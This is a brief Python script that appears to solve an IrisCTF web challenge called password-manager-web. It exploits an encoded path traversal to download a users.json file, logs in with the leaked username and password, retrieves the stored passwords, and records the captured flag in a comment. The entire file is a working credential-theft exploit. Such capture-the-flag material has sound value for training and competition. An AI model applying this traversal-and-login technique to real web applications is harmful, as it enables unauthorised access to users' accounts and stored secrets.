import requests

s = requests.Session()

url = "https://password-manager-web.chal.irisc.tf/"
#url = "http://127.0.0.1:8000/"


r = s.get(url + '%2e%2e%2e/%2e/users.json')

users = r.json()

print(users.items())
username,password = list(users.items())[0]


r = s.post(url + 'login', json={'usr': username, 'pwd': password})

print(r.text)


r = s.get(url + 'getpasswords')

print(r.text)

# irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}
